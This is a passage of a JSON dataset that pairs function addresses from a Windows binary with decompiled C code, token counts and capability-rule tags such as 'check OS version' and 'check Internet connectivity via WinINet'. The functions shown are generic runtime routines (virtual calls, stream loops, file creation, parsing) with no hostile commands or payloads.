            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041a3e4(void)\n\n{\n    int32_t *in_EAX;\n    \n    in_EAX[4] = in_EAX[4] + -1;\n    if (in_EAX[4] == 0) {\n        (**(*in_EAX + 0x30))();\n    }\n    return;\n}\n",
        "token_count": 75
    },
    "0041accc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041accc(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x14) != 0) {\n        (**(**(in_EAX + 0x14) + 0x10))();\n    }\n    fcn.00407024();\n    if (*(in_EAX + 0x14) != 0) {\n        (**(**(in_EAX + 0x14) + 0xc))();\n    }\n    return;\n}\n",
        "token_count": 110
    },
    "0041b3f0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041b3f0(uint arg_8h)\n\n{\n    int32_t *in_EAX;\n    int32_t in_EDX;\n    \n    if (*(in_EAX + 9) != '\\0') {\n        fcn.0041a4dc();\n    }\n    if ((in_EDX < 0) || (in_EAX[7] < in_EDX)) {\n        fcn.0041a4dc();\n    }\n    (**(*in_EAX + 0x88))(arg_8h);\n    return;\n}\n",
        "token_count": 122
    },
    "0041b7c8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041b7c8(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t *in_EAX;\n    int32_t *extraout_ECX;\n    \n    if (arg_ch == -1) {\n        if (0x7fffffff < arg_8h) {\ncode_r0x0041b7e0:\n            if (arg_ch == 0) {\n                if (arg_8h < 0x80000000) goto code_r0x0041b80a;\n            }\n            else if (arg_ch < 1) goto code_r0x0041b80a;\n        }\n    }\n    else if (-2 < arg_ch) goto code_r0x0041b7e0;\n    fcn.0040dbc0();\n    fcn.00404ec4();\n    in_EAX = extraout_ECX;\ncode_r0x0041b80a:\n    (**(*in_EAX + 4))();\n    return;\n}\n",
        "token_count": 220
    },
    "0041b868": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041b868(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t var_20h;\n    int32_t var_1ah;\n    uint *var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t *var_4h;\n    \n    var_14h = &var_20h;\n    var_10h = *(*in_EAX + 0x18);\n    var_4h = in_EAX;\n    var_20h = fcn.00404528();\n    while ((var_20h != 0 && (var_20h != *0x417954))) {\n        var_20h = fcn.004045dc();\n    }\n    if (var_20h == 0) {\n        fcn.0041b81c(&stack0xfffffffc);\n    }\n    unique0x00007a00 = *(var_20h + 0x18);\n    if (var_10h == unique0x00007a00) {\n        fcn.0041b81c(&stack0xfffffffc);\n    }\n    (**(*var_4h + 0x18))(param_2, param_2 >> 0x1f);\n    return;\n}\n",
        "token_count": 288
    },
    "0041b8ec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t __cdecl fcn.0041b8ec(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_ch == -1) {\n        if (0x7fffffff < arg_8h) {\ncode_r0x0041b90b:\n            if (arg_ch == 0) {\n                if (arg_8h < 0x80000000) goto code_r0x0041b935;\n            }\n            else if (arg_ch < 1) goto code_r0x0041b935;\n        }\n    }\n    else if (-2 < arg_ch) goto code_r0x0041b90b;\n    fcn.0040dbc0();\n    fcn.00404ec4();\ncode_r0x0041b935:\n    iVar1 = (**(*in_EAX + 0x14))();\n    return iVar1;\n}\n",
        "token_count": 224
    },
    "0041b9cc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041b9cc(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    uint *in_EDX;\n    uint32_t uVar1;\n    uint *in_FS_OFFSET;\n    int64_t iVar2;\n    uint uStackY52;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    iVar2 = CONCAT44(arg_ch, arg_8h);\n    if ((arg_ch == 0) && (iVar2 = CONCAT44(arg_ch, arg_8h),  arg_8h == 0)) {\n        uStackY52 = 0x41b9f1;\n        fcn.0041b750(0, 0);\n        uStackY52 = 0x41b9f7;\n        iVar2 = (***in_EDX)();\n    }\n    arg_ch = iVar2 >> 0x20;\n    arg_8h = iVar2;\n    if (arg_ch == 0) {\n        if (arg_8h < 0xf001) {\ncode_r0x0041ba25:\n            var_14h = arg_8h;\n            goto code_r0x0041ba2b;\n        }\n    }\n    else if (iVar2 < 0x100000000) goto code_r0x0041ba25;\n    var_14h = 0xf000;\ncode_r0x0041ba2b:\n    fcn.00402f00();\n    uStackY52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    do {\n        arg_ch = iVar2 >> 0x20;\n        arg_8h = iVar2;\n        if (iVar2 == 0) {\n            *in_FS_OFFSET = uStackY52;\n            fcn.00402f1c();\n            return;\n        }\n        uVar1 = var_14h;\n        if (var_14h >> 0x1f == arg_ch) {\n            if (arg_8h <= var_14h) {\ncode_r0x0041ba5d:\n                uVar1 = arg_8h;\n            }\n        }\n        else if (arg_ch <= var_14h >> 0x1f) goto code_r0x0041ba5d;\n        fcn.0041b95c();\n        fcn.0041b994();\n        iVar2 = iVar2 - uVar1;\n    } while( true );\n}\n",
        "token_count": 553
    },
    "0041bc28": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041bc28(uint noname_0, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffa8;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    if (in_DL != '\\0') {\n        puStack72 = 0x41bc4b;\n        in_EAX = fcn.00404974();\n        in_DL = extraout_DL;\n    }\n    uStack76 = 0x41bd70;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    var_1h._0_1_ = in_DL;\n    if (arg_ch == -1) {\n        in_stack_ffffffa8 = 0x80;\n        puStack72 = &fcn.0041bc28::var_1h + 1;\n        uVar1 = fcn.004059dc(0xc0000000, 0, 0, 2, 0x80, 0);\n        sub.kernel32.dll_CreateFileA_1(uVar1);\n        fcn.0041bb20();\n        if (*(in_EAX + 4) < 0) {\n            fcn.0040a714();\n            var_14h = 0;\n            var_10h._0_1_ = 0xb;\n            sub.kernel32.dll_GetLastError_1();\n            fcn.0040d2f0();\n            var_ch = 0;\n            var_8h._0_1_ = 0xb;\n            fcn.0040dbfc(1, &fcn.0041bc28::var_14h);\n            fcn.00404ec4();\n        }\n    }\n    else {\n        puStack72 = &fcn.0041bc28::var_1h + 1;\n        fcn.0040a174();\n        fcn.0041bb20();\n        if (*(in_EAX + 4) < 0) {\n            fcn.0040a714();\n            var_14h = 0;\n            var_10h._0_1_ = 0xb;\n            sub.kernel32.dll_GetLastError_1();\n            fcn.0040d2f0();\n            var_ch = 0;\n            var_8h._0_1_ = 0xb;\n            in_stack_ffffffa8 = 1;\n            fcn.0040dbfc(1, &fcn.0041bc28::var_14h);\n            fcn.00404ec4();\n        }\n    }\n    fcn.00405584();\n    *in_FS_OFFSET = in_stack_ffffffa8;\n    uStack80 = 0x41bd77;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 720
    },
    "0041c1e0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041c1e0(int32_t arg_8h)\n\n{\n    uint *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint *arg_ch;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    var_10h = 0;\n    var_4h = 0;\n    uStack28 = 0x41c272;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    if (*(arg_8h + 8) == '\\0') {\n        fcn.00405728();\n    }\n    else {\n        puStack24 = &stack0xfffffffc;\n        fcn.00409d78();\n    }\n    var_ch = var_4h;\n    var_8h._0_1_ = 0xb;\n    arg_ch = &var_ch;\n    arg_8h_00 = 0;\n    fcn.00407550();\n    fcn.0040db40(arg_8h_00, arg_ch);\n    fcn.00404ec4();\n    *in_FS_OFFSET = arg_8h_00;\n    uStack32 = 0x41c279;\n    fcn.00405530();\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 336
    },
    "0041c4d8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool fcn.0041c4d8(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    char *pcVar2;\n    \n    for (pcVar2 = *(in_EAX + 0x14); (*pcVar2 != '\\0' && (*pcVar2 != '.')); pcVar2 = pcVar2 + 1) {\n    }\n    cVar1 = *pcVar2;\n    if (cVar1 != '\\0') {\n        fcn.00405620();\n        fcn.00405a84();\n    }\n    return cVar1 != '\\0';\n}\n",
        "token_count": 133
    },
    "0041c5b4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041c5b4(uint param_1, char *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x41c65d;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    if (param_2 != NULL) {\n        while (*param_2 != '\\0') {\n            for (; (*param_2 != '\\0' && (1 < *param_2 - 0x2dU)); param_2 = param_2 + 1) {\n            }\n            fcn.00405620();\n            iVar2 = fcn.00420490();\n            if ((iVar2 == 0) && (cVar1 = fcn.00409a8c(),  cVar1 != '\\0')) {\n                iVar2 = in_EAX;\n            }\n            if (iVar2 == 0) break;\n            if (*param_2 == '.') {\n                param_2 = param_2 + 1;\n            }\n            if (*param_2 == '-') {\n                param_2 = param_2 + 1;\n            }\n            in_EAX = iVar2;\n            if (*param_2 == '>') {\n                param_2 = param_2 + 1;\n            }\n        }\n    }\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x41c664;\n    uStack36 = 0x41c65c;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 403
    },
    "0041c700": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041c700(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *in_FS_OFFSET;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = 0x41c713;\n    (**(**0x49a9b0 + 0x14))();\n    uStack40 = 0x41c8bc;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack48 = 0x41c72b;\n    puStack36 = &stack0xfffffffc;\n    iVar1 = fcn.00419c24();\n    uStack52 = 0x41c89d;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    if (*(iVar1 + 8) < 1) {\n        *in_FS_OFFSET = uStack56;\n        puStack48 = 0x41c8a4;\n        uStack52 = 0x41c89c;\n        fcn.00419c88();\n        return;\n    }\n    puStack60 = 0x41c751;\n    puStack48 = &stack0xfffffffc;\n    fcn.00404620();\n    uStack64 = 0x41c87e;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    puStack72 = 0x41c76e;\n    puStack60 = &stack0xfffffffc;\n    fcn.00404620();\n    uStack76 = 0x41c82c;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    iVar5 = 0;\n    puStack72 = &stack0xfffffffc;\ncode_r0x0041c80d:\n    while( true ) {\n        if (*(iVar1 + 8) <= iVar5) {\n            *in_FS_OFFSET = uStack80;\n            puStack72 = 0x41c833;\n            uStack76 = 0x41c82b;\n            fcn.00404650();\n            return;\n        }\n        puVar2 = fcn.004198b4();\n        iVar3 = fcn.00419400();\n        if (iVar3 != 0) break;\n        iVar4 = fcn.0041661c();\n        if (iVar4 != 0) break;\n        fcn.0041c6b8(&stack0xfffffffc);\n        iVar5 = iVar5 + 1;\n    }\n    if (iVar3 != 0) {\n        if ((*(iVar3 + 0x1c) & 2) != 0) {\n            fcn.0041c6b8(&stack0xfffffffc);\n            iVar5 = iVar5 + 1;\n            goto code_r0x0041c80d;\n        }\n        fcn.0041c5b4();\n        (***puVar2)();\n    }\n    fcn.0041c680(&stack0xfffffffc);\n    fcn.004197a8();\n    fcn.00404650();\n    goto code_r0x0041c80d;\n}\n",
        "token_count": 811
    },
    "0041c8cc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041c8cc(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*0x49a9cc == 0) {\n        return;\n    }\n    puStack28 = 0x41c8f2;\n    iVar2 = fcn.00419c24();\n    uStack32 = 0x41c967;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    iVar2 = *(iVar2 + 8) + -1;\n    puStack28 = &stack0xfffffffc;\n    if (-1 < iVar2) {\n        do {\n            iVar3 = fcn.004198b4();\n            if ((in_EAX == 0) || (*(iVar3 + 8) == in_EAX)) {\n                if (param_2 != 0) {\n                    cVar1 = fcn.00409a8c();\n                    if (cVar1 == '\\0') goto code_r0x0041c949;\n                }\n                fcn.004197a8();\n                fcn.00404650();\n            }\ncode_r0x0041c949:\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != -1);\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x41c96e;\n    uStack32 = 0x41c966;\n    fcn.00419c88();\n    return;\n}\n",
        "token_count": 392
    },
    "0041c978": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041c978(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    if (*0x49a9cc != 0) {\n        puStack24 = 0x41c995;\n        iVar1 = fcn.00419c24();\n        uStack28 = 0x41c9ef;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        iVar1 = *(iVar1 + 8) + -1;\n        puStack24 = &stack0xfffffffc;\n        if (-1 < iVar1) {\n            do {\n                iVar2 = fcn.004198b4();\n                if (*(iVar2 + 4) == in_EAX) {\n                    fcn.004197a8();\n                    fcn.00404650();\n                }\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != -1);\n        }\n        *in_FS_OFFSET = uStack32;\n        puStack24 = 0x41c9f6;\n        uStack28 = 0x41c9ee;\n        fcn.00419c88();\n        return;\n    }\n    return;\n}\n",
        "token_count": 303
    },
    "0041cac4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041cac4(uint noname_0, uint noname_1, code *arg_10h, uint arg_14h)\n\n{\n    char cVar1;\n    \n    cVar1 = fcn.00409a8c();\n    if ((cVar1 != '\\0') && (arg_10h._2_2_ != 0)) {\n        (*arg_10h)();\n        fcn.00405530();\n    }\n    return;\n}\n",
        "token_count": 105
    },
    "0041cb00": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041cb00(uint noname_0, uint noname_1, code *arg_10h, uint arg_14h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t *piVar2;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x41cb1c;\n    cVar1 = fcn.00409a8c();\n    if ((cVar1 != '\\0') && (arg_10h._2_2_ != 0)) {\n        puStack24 = 0x41cb37;\n        cVar1 = fcn.0041eb6c();\n        if (cVar1 != '\\n') {\n            *(in_EAX + 0x10) = *(in_EAX + 0x10) + -1;\n            puStack24 = 0x41cb49;\n            fcn.0041ec7c();\n            *(in_EAX + 0x88) = 1;\n            puStack24 = 0x41cb58;\n            fcn.0041ca14();\n        }\n        puStack24 = 0x41cb64;\n        piVar2 = fcn.00404620();\n        uStack28 = 0x41cbca;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        puStack24 = &stack0xfffffffc;\n        fcn.0041d004();\n        (**(*piVar2 + 4))();\n        fcn.0041d004();\n        *(in_EAX + 0x88) = 1;\n        (*arg_10h)();\n        *in_FS_OFFSET = uStack32;\n        puStack24 = 0x41cbd1;\n        uStack28 = 0x41cbc9;\n        fcn.00404650();\n        return;\n    }\n    return;\n}\n",
        "token_count": 454
    },
    "0041cc20": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041cc20(int32_t *arg_8h)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t in_EDX;\n    uint var_10ch;\n    char var_9h;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = in_EDX;\n    if (*(in_EAX + 0x42) == 0) {\n        var_9h = '\\x01';\n    }\n    else {\n        fcn.004057e8();\n        iVar1 = fcn.004048d4();\n        *arg_8h = iVar1;\n        arg_8h[1] = var_4h;\n        var_9h = *arg_8h == 0;\n        (*in_EAX[0x10])(&var_9h, arg_8h);\n    }\n    if (var_9h != '\\0') {\n        arg_8h[1] = var_4h;\n        iVar1 = (**(*in_EAX + 0x1c))();\n        *arg_8h = iVar1;\n    }\n    return;\n}\n",
        "token_count": 260
    },
    "0041cd10": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041cd10(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = 0x41cd22;\n    iVar1 = fcn.00419c24();\n    uStack24 = 0x41cd80;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    iVar1 = *(iVar1 + 8) + -1;\n    puStack20 = &stack0xfffffffc;\n    if (-1 < iVar1) {\n        do {\n            iVar2 = fcn.004198b4();\n            if ((*(iVar2 + 4) == *(in_EAX + 4)) && (*(iVar2 + 0xc) == *(in_EAX + 0xc))) {\n                fcn.00404650();\n                fcn.004197a8();\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != -1);\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x41cd87;\n    uStack24 = 0x41cd7f;\n    fcn.00419c88();\n    return;\n}\n",
        "token_count": 298
    },
    "0041cd8c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041cd8c(void)\n\n{\n    int32_t iVar1;\n    uchar *puVar2;\n    char cVar3;\n    int32_t *in_EAX;\n    uint *puVar4;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    puStack48 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack40 = 0x41cec2;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    iVar1 = in_EAX[0xc];\n    if (iVar1 != 0) {\n        uStack52 = 0x41cea5;\n        uStack56 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffc8;\n        var_10h = *(iVar1 + 8);\n        puVar2 = &stack0xfffffffc;\n        var_8h = in_EAX;\n        if (-1 < var_10h + -1) {\n            do {\n                puStack36 = puVar2;\n                puVar4 = fcn.004198b4();\n                fcn.004055c8();\n                (**(*var_8h + 0x24))();\n                var_ch = fcn.0041c5b4();\n                if ((var_ch == 0) && (*(var_8h + 0x7a) != 0)) {\n                    (*var_8h[0x1e])(&fcn.0041cd8c::var_ch);\n                }\n                fcn.004198b4();\n                fcn.0041cd10();\n                if ((var_ch == 0) && (cVar3 = fcn.0041c4d8(),  cVar3 != '\\0')) {\n                    fcn.004198b4();\n                    fcn.00419b9c();\n                    fcn.004199a8();\n                }\n                else {\n                    (***puVar4)();\n                }\n                var_10h = var_10h + -1;\n                puVar2 = puStack36;\n            } while (var_10h != 0);\n        }\n        *in_FS_OFFSET = uStack56;\n        puStack48 = 0x41ceac;\n        uStack52 = 0x41cea4;\n        fcn.0041cef4();\n        return;\n    }\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x41cec9;\n    uStack40 = 0x41cec1;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 638
    },
    "0041d2e0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_3h\n\nvoid __cdecl fcn.0041d2e0(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint16_t in_AX;\n    int32_t iVar2;\n    char in_DL;\n    int32_t iVar3;\n    uint var_3h;\n    \n    iVar2 = fcn.0040676c();\n    if (-1 < iVar2 + -1) {\n        iVar3 = 0;\n        do {\n            if (in_DL == '\\0') {\n                iVar1 = *(*(arg_8h + -4) + iVar3 * 4);\n                *(iVar1 + 0x1c) = ~in_AX & *(iVar1 + 0x1c);\n            }\n            else {\n                iVar1 = *(*(arg_8h + -4) + iVar3 * 4);\n                *(iVar1 + 0x1c) = *(iVar1 + 0x1c) | in_AX;\n            }\n            iVar3 = iVar3 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 260
    },
    "0041d3c8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041d3c8(int32_t arg_8h)\n\n{\n    uint16_t *puVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x41d4ae;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack32 = 0x41d3ed;\n    iVar2 = fcn.0041f014();\n    *(arg_8h + -0x14) = 0;\n    if (*(*(arg_8h + -8) + 0x72) != 0) {\n        puStack32 = arg_8h + -0x14;\n        uStack36 = 0x41d41f;\n        (**(*(arg_8h + -8) + 0x70))();\n    }\n    if (*(arg_8h + -0x14) == 0) {\n        puStack32 = 0x41d42d;\n        uVar3 = (**(iVar2 + -0xc))();\n        *(arg_8h + -0x14) = uVar3;\n        if ((*(arg_8h + -9) & 4) != 0) {\n            puVar1 = *(arg_8h + -0x14) + 0x1c;\n            *puVar1 = *puVar1 | 1;\n            puVar1 = *(arg_8h + -0x14) + 0x1c;\n            *puVar1 = *puVar1 | 0x200;\n        }\n        uStack36 = 0x41d482;\n        uStack40 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd8;\n        puStack32 = &stack0xfffffffc;\n        (**(**(arg_8h + -0x14) + 0x2c))();\n        *in_FS_OFFSET = uStack40;\n    }\n    puVar1 = *(arg_8h + -0x14) + 0x1c;\n    *puVar1 = *puVar1 | 1;\n    *in_FS_OFFSET = uStack28;\n    return;\n}\n",
        "token_count": 542
    },
    "0041d85c": {
        "rules": [
